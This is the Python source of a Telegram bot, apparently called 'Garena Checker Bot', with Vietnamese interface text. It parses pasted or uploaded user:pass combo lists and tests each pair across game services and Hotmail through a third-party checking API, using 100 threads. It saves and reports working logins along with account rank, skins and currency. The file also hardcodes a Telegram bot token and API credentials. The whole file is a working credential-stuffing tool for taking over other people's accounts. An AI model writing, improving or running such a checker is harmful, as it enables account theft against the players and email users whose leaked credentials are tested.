# bot.py - GARENA CHECKER BOT - FULL FIX
import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head><title>Garena Checker Bot</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#00ff00;">
<h1>Garena Checker Bot</h1>
<p>Status: <b style="color:#00ff00;">ALIVE</b></p>
<p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
</body>
</html>"""
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 100
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_FILTERED = "filtered_accounts.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan Mobile",
        "icon": "🎮"
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍"
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱"
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫"
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧"
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽"
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack",
        "icon": "📦"
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
filtered_accounts = []
pending_accounts = []
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
bot_start_time = datetime.now()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== HÀM GỬI TIN NHẮN AN TOÀN ==========
def safe_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    if not text:
        return
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts):
            try:
                if i == len(parts) - 1 and reply_markup:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode, reply_markup=reply_markup)
                else:
                    bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== TẠO NÚT BẤM ==========
def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("📝 Gui TK MK"),
        KeyboardButton("📁 Gui File TXT"),
        KeyboardButton("🔍 Loc TK MK tu TXT"),
        KeyboardButton("📊 Trang thai"),
        KeyboardButton("📥 Tai Hits"),
        KeyboardButton("📥 Tai Dead"),
        KeyboardButton("⏹ Dung check"),
        KeyboardButton("👤 Admin"),
        KeyboardButton("📋 Danh sach Service")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_service_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    
    for key, value in SERVICE_ROUTES.items():
        btn = InlineKeyboardButton(
            f"{value['icon']} {value['desc']}",
            callback_data=f"check_{key}"
        )
        buttons.append(btn)
    
    keyboard.add(*buttons)
    return keyboard

def create_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("👤 Admin: @baohuyno1", url="https://t.me/baohuyno1"),
        InlineKeyboardButton("📊 Trang thai", callback_data="admin_status"),
        InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
        InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
        InlineKeyboardButton("⏹ Dung check", callback_data="admin_stop"),
        InlineKeyboardButton("🗑 Xoa pending", callback_data="admin_clear"),
        InlineKeyboardButton("📋 Danh sach service", callback_data="admin_services")
    ]
    keyboard.add(*buttons)
    return keyboard

# ========== LỌC TK MK ==========
def loc_tk_mk(content):
    accounts = []
    seen = set()
    
    if not content:
        return accounts
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        user = None
        pwd = None
        
        separators = [':', '|', '/', '\t', ';', ' ']
        for sep in separators:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2:
                    user = parts[0].strip()
                    pwd = parts[1].strip()
                    if user and pwd:
                        break
                    else:
                        user = None
                        pwd = None
        
        if not user or not pwd:
            continue
        
        user_clean = re.sub(r'[^\w.@.-]', '', user)
        pwd_clean = pwd.strip()
        
        if len(user_clean) > 0 and len(pwd_clean) > 0:
            key = f"{user_clean}:{pwd_clean}"
            if key not in seen:
                seen.add(key)
                accounts.append((user_clean, pwd_clean))
    
    return accounts

# ========== CHECK API ==========
def check_account_api(username, password, service):
    route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get("status") == True or data.get("success") == True:
                            data["result"] = "hit"
                        elif data.get("status") == False or data.get("success") == False:
                            data["result"] = "dead"
                        else:
                            if "uid" in data or "name" in data or "data" in data:
                                data["result"] = "hit"
                            else:
                                data["result"] = "dead"
                    return data
                except json.JSONDecodeError:
                    return {"result": "unknown", "raw": resp.text[:200]}
            elif resp.status_code == 429:
                time.sleep(5)
            else:
                time.sleep(1)
        except:
            time.sleep(2)
    
    return {"result": "error", "message": "Request failed"}

# ========== FORMAT KẾT QUẢ ==========
def format_hit_dep(username, password, data, service=""):
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except:
            pass
    
    if not isinstance(data, dict):
        return f"""
✅ HIT
🔑 {username}:{password}
"""
    
    uid = data.get("uid", data.get("id", "N/A"))
    name = data.get("name", data.get("nickname", data.get("aov_name", "N/A")))
    region = data.get("region", data.get("country", "VN"))
    shells = data.get("shells", data.get("so", data.get("coins", 0)))
    rank = data.get("aov_rank", data.get("rank", data.get("tier", "N/A")))
    level = data.get("aov_level", data.get("level", data.get("lv", 0)))
    skins = data.get("aov_total_skins", data.get("skin", data.get("skins", 0)))
    heroes = data.get("aov_total_champs", data.get("hero", data.get("champs", 0)))
    
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    
    return f"""
{service_icon} ✅ HIT - {service.upper()}
🔑 {username}:{password}
🆔 UID: {uid}
👤 Name: {name}
🌐 Region: {region}
💰 So: {shells}
👑 Rank: {rank}
✨ Level: {level}
💎 Skin: {skins}
⚔️ Hero: {heroes}
"""

def format_dead_dep(username, password, service=""):
    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
    return f"""
{service_icon} ❌ DEAD - {service.upper()}
🔑 {username}:{password}
"""

# ========== CHECK ĐƠN ==========
def check_single_account(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service)
    result_type = result.get("result", "unknown")
    
    if result_type == "hit":
        with file_lock:
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        safe_send_message(chat_id, format_hit_dep(username, password, result, service))
    elif result_type == "dead":
        with file_lock:
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        safe_send_message(chat_id, format_dead_dep(username, password, service))
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service.upper()}\n🔑 {username}:{password}\n❌ Loi khi check")

# ========== CHECK NHIỀU ACCOUNT ==========
def check_accounts_batch(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{DEFAULT_THREADS}</code>
""")
    
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service)
        result_type = result.get("result", "unknown")
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                with file_lock:
                    with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
                try:
                    safe_send_message(chat_id, format_hit_dep(user, pwd, result, service))
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
                with file_lock:
                    with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                        f.write(f"{user}:{pwd}\n")
            else:
                stats["errors"] += 1
            
            if stats["checked"] % 50 == 0:
                try:
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / elapsed if elapsed > 0 else 0
                    safe_send_message(chat_id, f"""
📊 <b>TIEN DO</b>
✅ Checked: <code>{stats['checked']}/{total}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
                except:
                    pass
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                   for user, pwd in accounts}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    result_msg = f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ Errors: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
⚡ Toc do: <code>{stats['total']/elapsed:.1f}</code> acc/s
"""
    safe_send_message(chat_id, result_msg)
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
            except:
                pass

# ========== XỬ LÝ CALLBACK ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global pending_accounts, filtered_accounts, checking
    
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Ban khong co quyen!")
        return
    
    data = call.data
    
    if data.startswith("check_"):
        service = data.replace("check_", "")
        
        if service not in SERVICE_ROUTES:
            bot.answer_callback_query(call.id, "❌ Service khong hop le!")
            return
        
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        
        service_desc = SERVICE_ROUTES[service]["desc"]
        icon = SERVICE_ROUTES[service]["icon"]
        
        if pending_accounts:
            accounts = pending_accounts
            pending_accounts = []
            
            if len(accounts) == 1:
                user, pwd = accounts[0]
                safe_send_message(call.message.chat.id, f"{icon} Dang check <code>{user}:{pwd}</code> voi {service_desc}...")
                threading.Thread(target=check_single_account, args=(call.message.chat.id, user, pwd, service)).start()
            else:
                filtered_accounts = accounts
                safe_send_message(call.message.chat.id, f"{icon} Dang check {len(accounts)} acc voi {service_desc}...")
                threading.Thread(target=check_accounts_batch, args=(call.message.chat.id, accounts, service)).start()
        else:
            bot.answer_callback_query(call.id, "❌ Khong co accounts de check!")
    
    elif data == "admin_status":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(call.message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thoi gian: <code>{elapsed:.0f}s</code>
""")
        else:
            safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co hits!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(call.message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(call.message.chat.id, "❌ Chua co dead!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_stop":
        stop_event.set()
        checking = False
        safe_send_message(call.message.chat.id, "🛑 Da dung check!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_clear":
        pending_accounts = []
        safe_send_message(call.message.chat.id, "✅ Da xoa danh sach pending!")
        bot.answer_callback_query(call.id)
    
    elif data == "admin_services":
        msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        safe_send_message(call.message.chat.id, msg)
        bot.answer_callback_query(call.id)
    
    bot.answer_callback_query(call.id)

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    text = message.text.strip()
    
    # XỬ LÝ NÚT BẤM
    if text == "📝 Gui TK MK":
        safe_send_message(message.chat.id, """
📌 <b>GUI TK MK</b>
Gui truc tiep <code>user:pass</code> hoac nhieu accounts

VD:
<code>user1:pass123</code>
<code>user2:pass456</code>
<code>user3:pass789</code>
""")
        return
    
    elif text == "📁 Gui File TXT":
        safe_send_message(message.chat.id, """
📌 <b>GUI FILE TXT</b>
Gui file .txt chua danh sach tk mk
Bot se tu dong loc va check!
""")
        return
    
    elif text == "🔍 Loc TK MK tu TXT":
        safe_send_message(message.chat.id, """
🔍 <b>LOC TK MK TU TXT</b>

📌 Gui file .txt chua danh sach tai khoan
Bot se loc chi giu lai <code>user:pass</code>

📌 Ho tro dinh dang:
• <code>user:pass</code>
• <code>user|pass</code>
• <code>user/pass</code>

📌 Sau khi loc xong, chon service de check!
""")
        return
    
    elif text == "📊 Trang thai":
        if checking:
            elapsed = time.time() - stats.get("start_time", time.time())
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            safe_send_message(message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thoi gian: <code>{elapsed:.0f}s</code>
""")
        else:
            safe_send_message(message.chat.id, "💤 Bot dang ranh")
        return
    
    elif text == "📥 Tai Hits":
        try:
            with open(OUTPUT_HITS, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="✅ hits.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co hits!")
        return
    
    elif text == "📥 Tai Dead":
        try:
            with open(OUTPUT_DEAD, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="❌ dead.txt")
        except:
            safe_send_message(message.chat.id, "❌ Chua co dead!")
        return
    
    elif text == "⏹ Dung check":
        stop_event.set()
        checking = False
        safe_send_message(message.chat.id, "🛑 Da dung check!")
        return
    
    elif text == "👤 Admin":
        safe_send_message(message.chat.id, """
👤 <b>ADMIN</b>
📌 Admin: @baohuyno1
🔗 Lien he: https://t.me/baohuyno1

📋 <b>CHUC NANG ADMIN:</b>
• Quan ly bot
• Xem trang thai
• Tai hits/dead
• Dung check
• Xoa pending
""", reply_markup=create_admin_keyboard())
        return
    
    elif text == "📋 Danh sach Service":
        msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
        for key, value in SERVICE_ROUTES.items():
            msg += f"{value['icon']} <b>{value['desc']}</b>\n"
            msg += f"   Route: <code>{value['route']}</code>\n\n"
        safe_send_message(message.chat.id, msg)
        return
    
    if text.startswith('/'):
        return
    
    # XỬ LÝ TK MK
    accounts = loc_tk_mk(text)
    
    if not accounts:
        safe_send_message(message.chat.id, """
❌ <b>KHONG TIM THAY!</b>
Format dung: <code>user:pass</code> hoac <code>user|pass</code> hoac <code>user/pass</code>

📌 Vi du:
<code>ZzkeconzZ:thanhoppa2001</code>
""")
        return
    
    pending_accounts = accounts
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📌 <b>DA NHAN {total} ACCOUNTS</b>

<b>Preview (10 dong dau):</b>
<code>{preview}</code>
{"..." if total > 10 else ""}

👇 <b>Chon service de check:</b>
"""
    
    safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    global pending_accounts
    
    if not is_admin(message.chat.id):
        return
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(message.chat.id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        accounts = loc_tk_mk(content)
        
        if not accounts:
            safe_send_message(message.chat.id, "❌ Khong tim thay user:pass trong file!")
            return
        
        pending_accounts = accounts
        
        with open(OUTPUT_FILTERED, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ <b>LOC XONG!</b>
📊 Tong: <code>{total}</code> accounts

<b>Preview (20 dong dau):</b>
<code>{preview}</code>
{"..." if total > 20 else ""}

👇 <b>Chon service de check:</b>
"""
        
        safe_send_message(message.chat.id, msg, reply_markup=create_service_keyboard())
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Loi: {e}")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    
    try:
        bot.send_message(
            message.chat.id,
            f"""
🤖 <b>GARENA CHECKER BOT</b>
👤 Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a>
⏱ Uptime: <code>{hours}h {minutes}m</code>

📌 <b>CACH DUNG:</b>

1️⃣ <b>GUI TK MK</b>
Gui truc tiep <code>user:pass</code>
→ Chon service bang nut bam

2️⃣ <b>GUI FILE TXT</b>
Gui file .txt chua danh sach
→ Chon service bang nut bam

3️⃣ <b>LOC TK MK TU TXT</b>
Nhan nut <b>"🔍 Loc TK MK tu TXT"</b>
→ Gui file .txt de loc

⚡ <b>THREADS:</b> {DEFAULT_THREADS}
📋 <b>SERVICES:</b> {', '.join(SERVICE_ROUTES.keys())}

💡 <b>BOT 24/7 - LUON SAN SANG</b>
""",
            reply_markup=create_main_keyboard()
        )
    except Exception as e:
        print(f"[!] Loi gui /start: {e}")
        bot.send_message(
            message.chat.id,
            f"""
🤖 <b>GARENA CHECKER BOT</b>
👤 Admin: @baohuyno1
⏱ Uptime: {hours}h {minutes}m

📌 Bot da san sang! Dung /help de xem huong dan.
"""
        )

# ========== LỆNH /help ==========
@bot.message_handler(commands=['help'])
def cmd_help(message):
    if not is_admin(message.chat.id):
        return
    
    safe_send_message(
        message.chat.id,
        f"""
📌 <b>HUONG DAN SU DUNG</b>

<b>1. CHECK DON:</b>
Gui truc tiep: <code>user:pass</code>
→ Chon service

<b>2. CHECK HANG LOAT:</b>
Gui file .txt hoac nhieu accounts
→ Chon service

<b>3. LOC TK MK:</b>
Nhan nut <b>"🔍 Loc TK MK tu TXT"</b>
→ Gui file .txt

<b>4. CAC LENH:</b>
<code>/start</code> - Khoi dong bot
<code>/help</code> - Huong dan
<code>/loc</code> - Loc tk mk tu txt
<code>/status</code> - Xem trang thai
<code>/stop</code> - Dung check
<code>/hits</code> - Tai hits.txt
<code>/dead</code> - Tai dead.txt
<code>/clear</code> - Xoa pending

<b>5. HO TRO:</b>
👤 Admin: @baohuyno1
""",
        reply_markup=create_main_keyboard()
    )

@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    if not is_admin(message.chat.id):
        return
    
    safe_send_message(message.chat.id, """
🔍 <b>LOC TK MK TU TXT</b>

📌 <b>CACH DUNG:</b>
1️⃣ Nhan nut <b>"🔍 Loc TK MK tu TXT"</b>
2️⃣ Gui file .txt chua danh sach
3️⃣ Bot tu dong loc ra user:pass

📌 <b>HO TRO DINH DANG:</b>
• <code>user:pass</code>
• <code>user|pass</code>
• <code>user/pass</code>

📌 <b>VI DU:</b>
<code>ZzkeconzZ:thanhoppa2001</code>
<code>anhduckim1|kimanhduc1</code>
<code>trannamtrungzzz/cuong2001</code>
""")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    
    if checking:
        elapsed = time.time() - stats.get("start_time", time.time())
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        safe_send_message(message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: <b>YES</b>
✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
⏱ Thoi gian: <code>{elapsed:.0f}s</code>
""")
    else:
        safe_send_message(message.chat.id, "💤 Bot dang ranh")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    
    global checking
    stop_event.set()
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(OUTPUT_DEAD, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co dead!")

@bot.message_handler(commands=['clear'])
def cmd_clear(message):
    if not is_admin(message.chat.id):
        return
    
    global pending_accounts
    pending_accounts = []
    safe_send_message(message.chat.id, "✅ Da xoa danh sach pending!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not is_admin(message.chat.id):
        return
    
    msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{value['desc']}</b>\n"
        msg += f"   Route: <code>{value['route']}</code>\n\n"
    safe_send_message(message.chat.id, msg)

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT - 24/7")
    print("    ADMIN: @baohuyno1")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    try:
        bot.send_message(ADMIN_CHAT_ID, f"""
🤖 Bot da khoi dong!

📌 CACH DUNG:
• Gui user:pass -> Chon service
• Gui file .txt -> Chon service
• Nhan "🔍 Loc TK MK tu TXT" -> Gui file de loc

👤 Admin: @baohuyno1
""")
    except:
        pass
    
    print("[*] Bot dang chay 24/7...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            error_msg = str(e)
            if "409" in error_msg or "Conflict" in error_msg:
                print("[!] Loi 409 Conflict - Dang khoi dong lai...")
                time.sleep(5)
                continue
            else:
                print(f"[!] Loi: {e}")
                time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
